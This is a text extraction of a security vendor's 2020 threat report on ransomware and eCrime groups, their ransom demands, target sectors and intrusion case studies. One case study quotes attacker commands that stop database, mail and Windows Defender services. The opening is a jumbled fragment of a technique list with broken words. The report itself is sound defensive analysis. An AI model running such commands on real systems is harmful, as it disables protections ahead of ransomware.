Profile File and Directory Permissions Modification System Time DiscovService Execution Image File Execution Options Injection Process Injection File Deletion Virtualization/SandbSigned Binary Proxy Execution Kernel Modules and Extensions Scheduled Task File System Logical Offsets Signed Script Proxy Execution Launch Agent Service Registry Permissions Weakness Gatekeeper Bypass Source Launch Daemon Setuid and Setgid Group Policy Modification Space After Filename Launchctl SID-History Injection Hidden Files and Directories Third-party Software LC_LOAD_DYLIB Addition Startup Items Hidden Users Trap Local Job Scheduling Sudo Hidden Window Trusted Developer Utilities Login Item Sudo Caching HISTCONTROLUser Execution Logon Scripts Valid Accounts Image File Execution Options InjectionWindows Management Instrumentation LSASS Driver Web Shell Indicator BlockingWindows Remote Management Modify Existing Service Indicator Removal From ToolsXSL Script Processing Netsh Helper DLL Indicator Removal on HostNew Service Indirect Command Execution Office Application Startup Install Root Certificate Path Interception InstallUtil Plist Modification Launchctl Port Knocking LC_MAIN Hijacking Port Monitors Masquerading PowerShell Profile Modify Registry Rc.common Mshta Re-opened Applications Network Share Connection Removal Redundant Access NTFS File Attributes Registry Run Keys / Startup Folder Obfuscated Files or Information Scheduled Task Parent PID Spoofing Screensaver Plist Modification Security Support Provider Port Knocking Server Software Component Process Doppelgänging Service Registry Permissions Weakness Process Hollowing Setuid and Setgid Process Injection Shortcut Modification Redundant Access SIP and Trust Provider Hijacking Regsvcs/Regasm Startup Items Regsvr32 System Firmware Rootkit Systemd Service Rundll32 Time Providers Scripting Trap Signed Binary Proxy Execution Valid Accounts Signed Script Proxy Execution Web Shell SIP and Trust Provider Hijacking Windows Management Instrumentation Event Subscription Software Packing Winlogon Helper DLL Space After Filename Template Injection Timestomp Trusted Developer Utilities Valid Accounts Virtualization/Sandbox Evasion Web Service XSL Script Processing  Discovery Lateral Movement Collection Command and Control Exfiltration Impact Account Discovery AppleScript Audio Capture Commonly Used Port Automated Exfiltration Account Access Removal Application Window Discovery Application Deployment Software Automated Collection Communication Through Removable Media Data Compressed Data Destruction Browser Bookmark Discovery Component Object Model and Distributed COM Clipboard Data Connection Proxy Data Encrypted Data Encrypted for Impact Domain Trust Discovery Exploitation of Remote Services Data From Information Repositories Custom Command and Control Protocol Data Transfer Size Limits Defacement owsers File and Directory Discovery Internal Spear-phishing Data From Local System Custom Cryptographic Protocol Exfiltration Over Alternative Protocol Disk Content Wipe Network Service Scanning Logon Scripts Data From Network Shared Drive Data Encoding Exfiltration Over Command and Control Channel Disk Structure Wipe Network Share Discovery Pass the Hash Data From Removable Media Data Obfuscation Exfiltration Over Other Network Medium Endpoint Denial of Service al Access Network Sniffing Pass the Ticket Data Staged Domain Fronting Exfiltration Over Physical Medium Firmware Corruption Password Policy Discovery Remote Desktop Protocol Email Collection Domain Generation Algorithms Scheduled Transfer Inhibit System Recovery Peripheral Device Discovery Remote File Copy Input Capture Fallback Channels Network Denial of Service Permission Groups Discovery Remote Services Man in the Browser Multi-hop Proxy Resource Hijacking Process Discovery Replication Through Removable Media Screen Capture Multi-stage Channels Runtime Data Manipulation Query Registry Shared Webroot Video Capture Multiband Communication Service Stop Remote System Discovery SSH Hijacking Multilayer Encryption Stored Data Manipulation ng and Relay Security Software Discovery Taint Shared Content Port Knocking System Shutdown/Reboot Software Discovery Third-party Software Remote Access Tools Transmitted Data Manipulation System Information Discovery Windows Admin Shares Remote File Copy System Network Configuration Discovery Windows Remote Management Standard Application Layer Protocol System Network Connections Discovery Standard Cryptographic Protocol ie System Owner/User Discovery Standard Non-Application Layer Protocol n Interception System Service Discovery Uncommonly Used Port System Time Discovery Web Service Virtualization/Sandbox Evasion MITRE ATT&CK Heat Map of Tactics and Techniques OverWatch Observed in Targeted Attacks in 2019 In 2019, BGH, another term for enterprise-scale ransomware operations, was the most lucrative enterprise for eCrime adversaries.

Ransom demands soared into the millions (see Table 1), causing unparalleled disruption. CrowdStrike Intelligence observed the increasing sophistication of BGH criminal organizations attributed to WIZARD SPIDER and INDRIK SPIDER. The latter group splintered to form a new BGH adversary, DOPPEL SPIDER. All of these adversaries are well established in the criminal ecosystem. WIZARD SPIDER and INDRIK SPIDER operated profitable banking trojans before turning to ransomware to rapidly monetize their compromise of business and government networks. Ransomware-as-a-service (RaaS) developer PINCHY SPIDER, which takes a cut of the profits from its affiliates, began encouraging partners to adopt BGH practices in February 2019. Following a pseudo-retirement — in which PINCHY SPIDER and its partners switched from GandCrab to REvil — their use of BGH TTPs became increasingly apparent. The RaaS model of monetization and BGH tactics were also adopted by the developers of the Dharma and Nemty ransomware families. Suspected BGH and/or RaaS operations include the RobbinHood, LockerGoga, MegaCortex and Maze ransomware families.

While LockerGoga was only briefly active in 2019, recent infections were reported for the other three in November and December 2019. THE PERVASIVE RANSOMWARE THREAT 1_ Ransomware developers sell access to distributors (customers) through a partnership program. The program is operated under a financial model that splits profit per infection between the developers and distributors (e.g., 60/40 split). USD BTC Malware $12.5M ~1,600 Ryuk $10.9M 565 DoppelPaymer $10.0M 1,326 REvil $9.9M 1,250 Ryuk $6.1M 850 Maze $6.0M 763 REvil $5.3M 680 Ryuk $2.9M 375 DoppelPaymer $2.5M 250 REvil $2.5M 250 DoppelPaymer $2.3M 300 Maze $1.9M 250 DoppelPaymer $1.6M 216 BitPaymer $1.0M 128 Maze Table 1. Largest Ransom Demands Reported in 2019  Sector Known Ransomware Details Local Governments and Municipalities RobbinHood, Ryuk, REvil, DoppelPaymer The targeting of municipalities and local governments was popular among BGH criminal operators beginning in Spring 2019 and continuing through the rest of the year. Targets included several U.S.

states and cities, and multiple incidents were seen in Spain. Academic Ryuk An extension of local government targeting was first observed in Summer 2019: an outbreak of ransomware infections targeting public school systems in the U.S. This trend intensified in September 2019 during the back-to-school period and continued intermittently through the end of the year. Technology BitPaymer, REvil, Ryuk An alarming trend in targeted ransomware operations is the compromise of managed service providers (MSPs). Subsequent use of remote management software can enable the spread of ransomware to many companies from a single point of entry. WIZARD SPIDER also targeted this sector and impacted cloud service providers. Healthcare Ryuk, REvil A string of targeted healthcare attacks in the U.S., Canada and Australia from late September to early October was linked to WIZARD SPIDER. A PINCHY SPIDER affiliate also claimed a victim in this sector by first breaching an MSP, demonstrating how third parties can be vulnerable to these attacks.

Manufacturing BitPaymer, Ryuk, LockerGoga, DoppelPaymer Although the targeting of the manufacturing sector appeared to be intermittent, the known intrusions include energy and chemical companies among others. Financial Services BitPaymer, REvil INDRIK SPIDER claimed victims in the financial services sector in mid-2019. PINCHY SPIDER affiliates successfully impacted a Chinese asset management firm, demanding a significant ransom, and used financial themes for distribution. Media BitPaymer, Ryuk INDRIK SPIDER and WIZARD SPIDER claimed victims in this sector. Trends in BGH Incidents Targeting Sectors in 2019 Although ransomware was widespread in 2019 and affected all sectors, CrowdStrike Intelligence identified several trends in the targeting of specific sectors, and in the impacts observed from these targeted operations. THE MONOLITH: WIZARD SPIDER In 2019, two lines of analysis came together when CrowdStrike Intelligence attributed the operation of Ryuk ransomware to WIZARD SPIDER. Previously, these campaigns were tracked separately under the cryptonym GRIM SPIDER; however, beginning in March 2019, evidence coalesced behind the conclusion that Ryuk campaigns were operated by the core group of WIZARD SPIDER, the wellestablished criminal adversary behind the TrickBot banking trojan.

WIZARD SPIDER continues to develop TrickBot, offering customized modules for close affiliates including LUNAR SPIDER, operator of BokBot. CrowdStrike identified numerous spam campaigns delivering TrickBot using government or business themes, further evidence that this adversary aims to compromise large corporations and organizations. As additional support to TrickBot infections, WIZARD SPIDER uses Android malware known as AndroStealer to steal SMS messages sent and received by the device to enable the theft of two-factor authentication (2FA) tokens and subsequent financial fraud. Finally, TrickBot modules are used to identify victims of interest for the deployment of WIZARD SPIDER’s post-exploitation tool, Anchor DNS. Often identified on pointof-sale (PoS) endpoints, this piece of malware could enable WIZARD SPIDER to conduct financial fraud directly from the victimized systems, without the use of webinjects available in TrickBot or the deployment of ransomware. WIZARD SPIDER defies any attempts to categorize its operations, having mastered multiple forms and variations of criminal enterprise.

The sum total of all of its operations has led to WIZARD SPIDER becoming the most reported adversary of 2019 across all lines of reporting. BIG GAME HUNTERS CrowdStrike identified numerous spam campaigns delivering TrickBot using government or business themes, further evidence that this adversary aims to compromise large corporations and organizations. THE WANTED: INDRIK SPIDER INDRIK SPIDER’s BitPaymer operations continued at pace throughout 2019, and CrowdStrike Intelligence also observed the intermittent distribution of Dridex, the group’s banking trojan. Then, on December 5, 2019, the U.S. Department of Justice (DOJ) unsealed an indictment of two Russian individuals — Maksim Viktorovich Yakubets and Igor Turashev — for their involvement with Bugat malware, which is the predecessor of Dridex. Since neither the U.S. nor the U.K. have an extradition treaty with Russia, it is unlikely these individuals will be immediately arrested. However, CrowdStrike Intelligence continues to monitor for activity from both Dridex and BitPaymer ransomware to identify any possible impact on INDRIK SPIDER, as well as the splinter group DOPPEL SPIDER.

THE DOPPELGANGER: DOPPEL SPIDER In June 2019, CrowdStrike Intelligence observed a source code fork of BitPaymer and began tracking the new ransomware strain as DoppelPaymer. Further technical analysis revealed an increasing divergence between two versions of Dridex, with the new version dubbed DoppelDridex. Based on this evidence, CrowdStrike Intelligence assessed with high confidence that a new group split off from INDRIK SPIDER to form the adversary DOPPEL SPIDER. Following DOPPEL SPIDER’s inception, CrowdStrike Intelligence observed multiple BGH incidents attributed to the group, with the largest known ransomware demand being 250 BTC. Other demands were not nearly as high, suggesting that the group conducts network reconnaissance to determine the value of the victim organization. INDRIK SPIDER’s BitPaymer operations continued at pace throughout 2019, and CrowdStrike Intelligence also observed the intermittent distribution of Dridex, the group’s banking trojan. THE PIONEER: PINCHY SPIDER First observed in 2018, PINCHY SPIDER pioneered the RaaS model of operations, in which the developer receives a share of the profits that affiliates collect from successful ransomware infections.

Beginning in February 2019, this adversary advertised its intention to partner with individuals skilled in RDP/VNC networks and with spammers who have experience in corporate networking. Combined with observed hands-on activity by affiliates that resulted in the installation of GandCrab ransomware, this indicated a clear intention by PINCHY SPIDER to move toward BGH operations. In May 2019, PINCHY SPIDER announced its retirement from GandCrab operations. This development coincided with the rise of REvil ransomware (aka Sodinokibi). Analysis of code overlaps and distribution methods for these two ransomware families led to the determination that PINCHY SPIDER had not retired but was operating and developing REvil. The decision to announce the retirement of GandCrab on forums was possibly due to the public scrutiny and popularity that the operation was attracting, which likely included interest by international law enforcement agencies. Using REvil, PINCHY SPIDER and its affiliates began BGH operations in earnest. Ransom demands in REvil operations, compared to PINCHY SPIDER’s former GandCrab operations, have been significantly larger; one of the largest REvil demands identified was for $10 million USD.

CrowdStrike Intelligence has continued to track REvil samples and associated affiliate numbers since mid-2019. As of December 2019, a total of 699 unique samples of REvil have been identified, as well as 39 unique affiliate IDs (see Figure 5). Overview In October 2019, OverWatch identified an eCrime intrusion and observed malicious activity reflective of an early-stage hands-on ransomware attack. It involved the retrieval and deployment of multiple actor tools, including a malicious binary identified by CrowdStrike Intelligence as REvil. Initial Observations The initial intrusion vector was likely a password-spraying attack against Remote Desktop Protocol (RDP) and Server Message Block (SMB) services exposed to the internet, allowing the unidentified actor to obtain the necessary credentials to access the network and carry out its actions on objectives. OverWatch identified a high volume of failed RDP logon events across multiple user accounts in activity reflective of password spraying, a technique used as an alternative to brute forcing where an actor will perform logon attempts against multiple user accounts using a list of commonly used passwords.

OverWatch often observes this technique prior to targeted ransomware attacks. The actor appeared to target both RDP and SMB services on a public-facing host and was ultimately able to successfully guess an account password, enabling them to interactively log on to the system, drop tools and execute custom scripts. The password-spraying technique is often preferred over brute forcing as it mitigates the possibility of account lockouts that typically occur when an actor performs multiple failed logon attempts against a single account. Notable Adversary Behavior In preparation for the intended execution of the REvil ransomware binary, the adversary dropped custom .bat scripts, which upon execution launched multiple net stop and taskkill commands to stop a number of critical services on the host system associated with Microsoft Internet Information CROWDSTRIKE GLOBAL THREAT REPORT 2020 21 Services (IIS), Microsoft SQL Server and Microsoft Exchange. net stop IISADMIN net stop SQLBrowser net stop MSExchangeSA taskkill /f /im mysql* Presumably, these services are stopped in order to unlock their data files to be encrypted.

Notably, two additional batch files were also written to the host but were not executed. Further analysis of the files suggested that the execution of these scripts would likely have inhibited system recovery via the deletion of volume shadow copies, as well as the deletion of system or security logs as a means of removing indicators from the host. Additionally, the actor was also observed using the net command to stop the Windows Defender service. net stop WinDefend The actor wrote the REvil binary to the \Documents directory on the host: C:\Users\user\Documents\[REDACTED]\svhost.exe (sic) However, the adversary was not able to execute the file before the intrusion was stopped. Interestingly, the binary appeared to be masquerading as the Windows Shared Service Host process in a further attempt to evade detection. Conclusions and Recommendations The actor’s use of “living off the land” (LOTL) techniques reinforces the importance of having humans continuously hunting across a network in order to enable rapid response to quickly developing threat activity.

The deployment of the CrowdStrike Falcon agent, complemented with the OverWatch managed threat hunting service, allowed for the prompt identification of actor tradecraft and the subsequent containment and response. To defend against password spraying, the use of strong account management — in conjunction with effective account lockout policies following a defined number of failed login attempts and the use of complex passwords — can assist in preventing passwords from being guessed. In addition, ensure that RDP services are appropriately locked down and avoid leaving them exposed to the internet. DHARMA RANSOMWARE ACTIVITY OVERWATCH FEATURE_ Overview CrowdStrike observed numerous attempts by criminal actors to gain access to victim hosts over RDP in order to install RaaS malware families — primarily Dharma, but in at least one case, REvil. The target scope for these incidents is worldwide, and they have varied in size from small businesses to Fortune 500 conglomerates. CrowdStrike has observed incidents targeting entities in the academic, government, healthcare, hospitality, technology, energy, financial services and manufacturing sectors.

These attacks are consistent with a move by eCrime adversaries toward BGH operations and represent a specific trend observed throughout 2019 of RaaS affiliates attempting enterprise ransomware operations. OverWatch observed an example of such a BGH intrusion in early April 2019 against a large network. The threat actor attempted to deploy ransomware known as Dharma; however, Falcon successfully blocked its execution. CrowdStrike Intelligence observed that Dharma has been in use since 2016 as a direct result of the evolution of the Crysis ransomware. The ransomware is highly configurable and operates on an affiliate-based system. Typically for these intrusions, as is the case for many other BGH attacks, the threat actors gain access to the systems by exploiting vulnerable machines, or they bruteforce passwords for machines with weak or predictable RDP credentials. Initial Observations OverWatch identified initial interactive behavior when the adversary executed a collection of malicious scripts under the Local Administrator account.

These scripts automated the configuration changes to the system that enabled persistent remote access, attempted to execute Dharma ransomware and removed operating system logs. CROWDSTRIKE GLOBAL THREAT REPORT 2020 23 Notable Adversary Behavior The initial script executed, named Zzz.bat, kicked off the execution of the following tasks: Assigned new password for local accounts Queried the operating system for users in Local Administrator and Remote Access groups Manipulated accounts and user group settings Added new user accounts Manipulated file system permissions to hide newly added accounts Modified registry settings for remote access, disabling connection duration timeout limitations Hid newly added accounts from the initial logon screen view Created the directory System64Q.dll with additional tools start.cmd, Loog.bat, rdpclip.exe (renamed NSSM Service Manager) and payload.exe (Dharma) Executed the start.cmd script, which created a new service called WindowsSystem set to execute ransomware payload Executed the Loog.bat script, which cleared operating system event logs Shortly after, the newly created service WindowsSystem attempted to execute the Dharma ransomware payload; however, the activity was blocked by Falcon.

In response, the threat actor downloaded the Process Hacker tool and actively debugged further failed attempts to execute ransomware. After inspecting the operating system behavior, the threat actor elevated privileges to target installed security software and attempted to disable native operating system features. Conclusions and Recommendations The adversary was ultimately unsuccessful in its attack, thanks to the combination of Falcon telemetry and OverWatch threat hunting. Nevertheless, this intrusion emphasizes the need for successful prevention, rapid detection and timely response capabilities. OverWatch recommends that customers: Review current remote access points and ensure that logging is enabled and retained, and that access is monitored and restricted to necessary resources only. Implement multifactor authentication for all external remote access points, external applications and sensitive internal applications within the environment to mitigate the risk of unauthorized access via valid credentials/weak passwords. Perform regular scanning for and emergency patching of high-priority vulnerabilities. Define a set of emergency procedures that enables security teams to invoke operations such as host containment, firewall change requests or revocation of account privileges.

In September 2019, CrowdStrike Intelligence detected and analyzed a previously unidentified data exfiltration tool attributed to WIZARD SPIDER, dubbed Sidoh. The functionality of this malware includes the ability to search for keywords within files, including words related to sensitive information. The nature of these keywords suggests that the adversary could collect data in order to threaten the release of sensitive information if ransoms are not paid (i.e., data extortion) or to sell data to other adversaries (an additional method of monetization). Although the exact use of Sidoh has not been determined, the list of strings the tool uses to select data for exfiltration includes words such as military, secret, clandestine and government, raising the question of whether WIZARD SPIDER is supporting government espionage. Interestingly, along with the DOJ indictment of INDRIK SPIDER, the U.S. Department of the Treasury’s Office of Foreign Assets Control (OFAC) announced sanctions, noting that Yakubets has maintained links to and worked for the Russian Federal Security Service (FSB) since 2017.

This activity includes items such as "acquiring confidential documents through cyber-enabled means and conducting cyber-enabled operations on its behalf.” In 2018, Yakubets began a process to obtain a license to work on Russian classified information for the FSB, which provides further weight to historical evidence of Russia-based eCrime actors enabling state activities. The increasing threat of data extortion as an alternative method of monetization was observed at the end of 2019, with operators of both REvil and Maze ransomware threatening to leak data, and in some cases following through, if ransoms were not paid. Given these observations, it is possible that data extortion will be used increasingly by these actors to apply additional pressure on victims who don’t pay and instead choose to restore their networks using backup copies of the data. LOOKING FORWARD The increasing threat of data extortion as an alternative method of monetization was observed at the end of 2019, with operators of both REvil and Maze ransomware threatening to leak data, and in some cases following through, if ransoms were not paid.

In addition to high-volume ransomware attacks, CrowdStrike Intelligence continued to track numerous eCrime threats, including banking trojans, spambots, Business Email Compromise (BEC) scams, targeted eCrime operations, carding shops and malware-as-a-service (MaaS) developers. This section covers notable trends in the cybercriminal ecosystem, including observed trends in TTPs and targeting. The following figures provide a visual summary of the activity that CrowdStrike Intelligence reported on in 2019. Figures 6 and 7 provide a clear indication of the level of threat ransomware poses. Of all eCrime threats, ransomware represented 26% of what was reported in 2019. The number climbs to 37% of threats when ransomware reports are combined with reports of banking trojan malware operated by BGH adversaries (e.g., TrickBot). Of note, one of the most reported ransomware threats was GandCrab, which is not listed as a top threat in Figure 6. This malware is now inactive and was replaced operationally by REvil.

The combined number of GandCrab and REvil incidents led to PINCHY SPIDER being the second most reported eCrime adversary in 2019. After PINCHY SPIDER and operators of Dharma targeted ransomware operations, the BGH adversaries WIZARD SPIDER, INDRIK SPIDER and DOPPEL SPIDER together represent a third of reported eCrime, with WIZARD SPIDER alone making up a quarter of the total. ECRIME TRENDS AND ACTIVITY The combined number of GandCrab and REvil incidents led to PINCHY SPIDER being the second most reported eCrime adversary in 2019. REPORTED eCRIME by Adversary TINY SPIDER VENOM SPIDER SKELETON SPIDER CLOCKWORD SPIDER SCULLY SPIDER CARBON SPIDER SALTY SPIDER DOPPEL SPIDER GRACEFUL SPIDER COBALT SPIDER INDRIK SPIDER NARWHAL SPIDER SMOKY SPIDER LUNAR SPIDER MUMMY SPIDER PINCHY SPIDER WIZARD SPIDER  REPORTED eCRIME by Threat Type Remote Access Tools Point of Sale Vulnerability Exploit Kits Botnet Phishing Campaigns Criminal Forum Activity Spambot Targeted eCrime Malware Information Stealer  Malware Downloaders Banking Trojan Ransomware Top Threats: Ryuk Top Threats: TrickBot BokBot REvil Dharma Top Threats: Emotet Smoke Bot GetAndGo Loader  TERMINATING SECURITY PRODUCTS Across multiple ransomware cases, CrowdStrike observed perpetrators consistently attempting to terminate security software, such as endpoint protection products or security information and event management (SIEM) alert forwarders.

Ransomware operators — including Dharma and Phobos affiliates — have primarily used two publicly available utilities for this purpose: PCHunter and ProcessHacker. Notably, one of the improvements to BitPaymer that DOPPEL SPIDER introduced was the bundling of ProcessHacker within DoppelPaymer to kill blacklisted processes. These powerful utilities allow actors to not only view and terminate processes, but also directly interface with the Windows kernel itself. Other free utilities for terminating security software include PowerTool x64, GMER, Total Uninstall Portable and Defender Control. DNS TUNNELING The use of the DNS protocol for command-and-control (C2) communications is a useful tactic in the event that other common internet protocols are disabled or closely inspected in a corporate environment. Although this is not a new technique, CrowdStrike Intelligence identified some significant examples of adversaries adopting this TTP. In September 2019, CARBON SPIDER began using a variant of its first-stage Harpy backdoor that is capable of using DNS as a backup channel for C2 if HTTP fails.

USE OF COMPROMISED SITES HOSTING WORDPRESS CMS In Q3 2019, CrowdStrike Intelligence noted an overall increase in criminal actors using compromised websites hosting individual instances of the WordPress content management system (CMS). In many cases, these sites were used to deliver malware, including REvil, MUMMY SPIDER’s Emotet, and QakBot. Sites compromised in this fashion have also been implicated in possible credential harvesting operations. On Sept. 25, 2019, CrowdStrike Intelligence identified several malicious phishing pages designed to impersonate a Microsoft Office 365 landing page. The majority of these pages were hosted on legitimate domains likely compromised through vulnerabilities in CMS plugins. In 2019, CrowdStrike Intelligence tracked the development of numerous dropper document families, given the names Gemini, Leo and Virgo. These were most notably used by COBALT SPIDER but were not exclusive to this adversary. COBALT SPIDER’s use of Leo documents featured theme and code overlap with a CARBON SPIDER Harpy campaign.

Analysis from late 2019 revealed that Virgo documents were widespread and linked to the use of numerous information stealers, including FormBook, Pony and LokiBot. From July to September 2019, CrowdStrike Intelligence noted an increase in the use of a document family called TandemDrop. These malicious, macro-enabled documents are capable of distributing multiple malware variants from a single document. Observed pairings delivered by TandemDrop documents include: Gozi ISFB and REvil TrickBot and Gozi ISFB Vidar Stealer and Gozi ISFB Predator the Thief Stealer and an unconfirmed payload TandemDrop has also been used to deliver a single malware family. One such campaign distributed MUMMY SPIDER’s Emotet malware in September 2019. EMAIL THREAD HIJACKING In October 2019, CrowdStrike Intelligence identified multiple Emotet spam campaigns conducted by MUMMY SPIDER using a technique referred to as email thread hijacking. Email thread hijacking exploits email content previously collected by Emotet’s email harvester module. After a victim’s email content has been stolen, MUMMY SPIDER identifies email threads by the subject line (e.g., Re:) and formulates a reply to the thread.

This tactic increases the likelihood that a recipient will open a malicious attachment (or click a link) because the sender appears to be someone that they previously communicated with, and the subject line matches a prior conversation thread that they had with that person. Given that BGH actors WIZARD SPIDER, INDRIK SPIDER and DOPPEL SPIDER are all customers of MUMMY SPIDER, Emotet campaigns leading to the compromise of enterprise networks may support targeted ransomware operations. CrowdStrike Intelligence tracks enablers as adversaries that specialize in the delivery or development of malware. Developers monetize their malware-as-aservice (MaaS) operations through the sale and/or rental of malware. Distributors fall into two categories: operators of spambots and operators of download services. Existing between these two categories are adversaries that develop criminal loaders. An example of this operational model is SMOKY SPIDER, which develops the criminal loader known as Smoke Bot, which is sold on underground forums and has been observed supporting the distribution of numerous malware families.

DISTRIBUTION SERVICES SUPPORTING ESTABLISHED ECRIME ADVERSARIES Download-as-a-service (DaaS) operations began a transformation in 2017 when MUMMY SPIDER shifted the operation of Emotet from a banking trojan to a distribution service. In 2019, further evidence of what has been observed since then suggests that LUNAR SPIDER (operator of BokBot) and SCULLY SPIDER (operator of DanaBot) are making similar moves away from banking trojan operations and toward download services supporting the distribution of third-party malware. The success of these adversaries has not been matched by other actors. Spambots continued to decline in 2019, with MONTY SPIDER’s CraP2P spambot falling silent in April. NARWHAL SPIDER’s operation of Cutwail v2 was limited to country-specific spam campaigns, although late in 2019 there appeared to be an effort to expand by bringing in INDRIK SPIDER as a customer. ECRIME ENABLERS Adversary Operational Model Last Active LUNAR SPIDER Download-as-a-Service (DaaS)/Banking Trojan Jan 2020 MONTY SPIDER Spambot Apr 2019 — Inactive MUMMY SPIDER DaaS Jan 2020 NARWHAL SPIDER Spambot Dec 2019 NOCTURNAL SPIDER MaaS May 2019 SCULLY SPIDER DaaS/Banking Trojan Jan 2020 SMOKY SPIDER DaaS Jan 2020 VENOM SPIDER MaaS Dec 2019  VENOM SPIDER: A MAAS OPERATIONAL MODEL VENOM SPIDER is the developer of a large toolset that includes SKID, VenomKit and Taurus Loader.

Under the moniker “badbullzvenom,” the adversary has been an active member of Russian underground forums since at least 2012, specializing in the identification of vulnerabilities and the subsequent development of tools for exploitation, as well as for gaining and maintaining access to victim machines and carding services. Recent advertisements for the malware indicate that VENOM SPIDER limits the sale and use of its tools, selling modules only to trusted affiliates. This preference can be seen in the fact that adversaries observed using the tools include the targeted criminal adversary COBALT SPIDER and BGH adversaries WIZARD SPIDER and PINCHY SPIDER (see Figure 9). Tool Description Taurus Loader Taurus Loader is a document builder that creates malicious VBA MS Word documents that download an additional JavaScript scriptlet containing a DLL file. VENOM SPIDER has developed several modules for Taurus Loader; these include a Stealer Module, a TeamViewer Module, a Reconnaissance Module and a Ransomware Module.

SKID SKID is a JavaScript backdoor also known as More_Eggs. On July 10, 2019, VENOM SPIDER advertised SKID on underground forums for $3,500 USD and stated that the loader is used for targeted attacks only. VenomKit VenomKit is an exploit document builder that supports delivery of executable, DLL or PowerShell script payloads along with an additional MS Word file that acts as a decoy and includes text or images to enhance social engineering. Table 4. Summary of VENOM SPIDER Tools Recent advertisements for the malware indicate that VENOM SPIDER limits the sale and use of its tools, selling modules only to trusted affiliates. LOOKING FORWARD Following a summer hiatus, MUMMY SPIDER Emotet campaigns exhibited an extremely broad geographic scope, suggesting the adversary continues to expand its operations. The use of email thread hijacking, an insidious tactic designed to exploit human interactions, is the latest improvement the actor has made to support its customers.

CrowdStrike Intelligence expects the use of this tactic to continue into 2020 and anticipates MUMMY SPIDER will continue to make developments that ensure the scale of Emotet infections will attract criminal actors of every level of sophistication. The effort by all of the distributors — even the flagging spambots — to enable BGH adversaries like WIZARD SPIDER speaks to the enormous ripple effect that targeted ransomware has made in the criminal ecosystem. Even MaaS vendors have found themselves assembling and offering ransomware modules to go with their suite of tools, in an effort to skim a profit from the desires of less sophisticated but eager actors. It remains to be seen if these endeavors will provide lasting security for these operations. The future — and the largest cut of profits — seems destined to belong to those actors that have been able to master multiple methods of monetizing their skills and tools.

Still, MaaS developers may prefer to stay out of the limelight, as suggested by VENOM SPIDER’s judicious cherry-picking of customers. Pleasing a few selected operators carries less risk than hands-on-keyboard activity within a victim’s network, as well as arguably aiding in protecting the developer’s operational security. The future — and the largest cut of profits — seems destined to belong to those actors that have been able to master multiple methods of monetizing their skills and tools. TARGETED ECRIME ACTIVITY Historically, CrowdStrike Intelligence has tracked a subset of eCrime adversaries that are conducting wire fraud and/or compromising point-of-sale (PoS) systems at scale. In 2016 and 2017, their operations were notable because they targeted large enterprises using initial exploitation, lateral movement and exfiltration techniques commonly associated with nation-state actors. With the rise and dominance of BGH, which also relies on these methods, the relative uniqueness of targeted eCrime is no longer as apparent.

In fact, the original BGH group BOSS SPIDER was tracked as a targeted eCrime adversary until 2018. Despite the changing criminal landscape, targeted eCrime adversaries continue to evolve and expand their operations. They are distinguished from BGH adversaries by their methods of monetization, which generally do not include enterprise-wide ransomware infections. One noted exception to this is GRACEFUL SPIDER, which has used Clop ransomware against victims. CrowdStrike Intelligence continues to evaluate activity from this actor but tracks it as a targeted eCrime adversary at this time due to its PoS compromises. The other named adversaries that have been linked to PoS data compromises are CARBON SPIDER, TINY SPIDER and SKELETON SPIDER. The adversaries that are specifically targeting financial institutions monetize the theft of large sums via wire fraud or ATM cash-outs. In 2019, CrowdStrike Intelligence observed an increase in such campaigns, with activity expanding beyond the U.S., Canada and Europe to affect South and Central America and Africa.

Adversaries employing this operational model include COBALT SPIDER, ANTHROPOID SPIDER and WHISPER SPIDER. Despite the changing criminal landscape, targeted eCrime adversaries continue to evolve and expand their operations. Adversary Ops Tempo Description  In the second half of 2019, GRACEFUL SPIDER conducted broad spam campaigns on a weekly basis. These campaigns used malicious macro-enabled documents to drop GetAndGo Loader. Through 2019, COBALT SPIDER used spear-phishing to deliver a diverse suite of droppers, all of which ultimately downloaded the group’s custom COBINT malware. COBALT SPIDER primarily targeted North American and European financial institutions but also likely expanded in scope to include Central and South American financials. Through 2019, CARBON SPIDER primarily targeted the hospitality sector in pursuit of payment card data. The adversary continued to use Harpy as first-stage malware. In September, Harpy samples began using DNS tunneling as a backup C2 method. In 2019, SKELETON SPIDER almost certainly used the FrameworkPoS malware in a campaign.

The adversary likely began targeting card-not-present (CNP) data also, using formjacking, MaaS vendor VENOM SPIDER’s Taurus Loader Stealer and SKID malware in targeted operations. Publicly known as “Silence Group,” WHISPER SPIDER conducted a handful of TrueBot spear-phishing campaigns in 2019. These operations primarily targeted Russian banks, although WHISPER SPIDER intrusions were also identified at banks in Sub-Saharan Africa and Central America. Publicly known as “EmpireMonkey,” ANTHROPOID SPIDER conducted phishing campaigns in February and March 2019, spoofing French, Norwegian and Belizean financial regulators and institutions. These campaigns used macro-enabled Microsoft documents to deliver the PowerShell Empire post-exploitation framework. ANTHROPOID SPIDER likely enabled a breach that allegedly involved fraudulent transfers over the SWIFT network. In 2019, TINY SPIDER sporadically used LUNAR SPIDER’s BokBot to disseminate the loader TinyLoader, which is used to deploy the lightweight PoS malware TinyPoS. Table 5. Summary of Activity Attributed to Targeted eCrime Adversaries in 2019  THE ANOMALY: GRACEFUL SPIDER’S HIGH-VOLUME OPERATIONS Throughout the second half of 2019, GRACEFUL SPIDER disseminated GetAndGo Loader in broad spam campaigns, primarily by using pages that impersonate legitimate file-sharing sites to deceive users into downloading a malicious macroenabled document.

GetAndGo Loader has delivered FlawedAmmyy, the Foundation malware framework and, most recently, GRACEFUL SPIDER’s custom Remote Access Tool (RAT) SDBBot. SDBBot has three main parts: The installer deploys the other components and creates an auto-start execution point (ASEP) on the system; an intermediate component called RegCodeLoader is used by the ASEP to load the malware; and the last component is the malicious RAT payload. GRACEFUL SPIDER conducts these campaigns at greater scale and frequency than other targeted eCrime actors. Rather than focusing specifically on a particular industry, the adversary has targeted organizations in almost every sector across the globe. CrowdStrike Intelligence observed efforts to more selectively target victims in October 2019, when the actor introduced victim IP address geolocation filtering. For example, certain malicious landing pages only delivered malware to South Koreabased IP addresses (on October 23 and 24, 2019). This tactic has the added benefit of interfering with automated security tools and sandboxes that do not have VPN exit points in a targeted country.

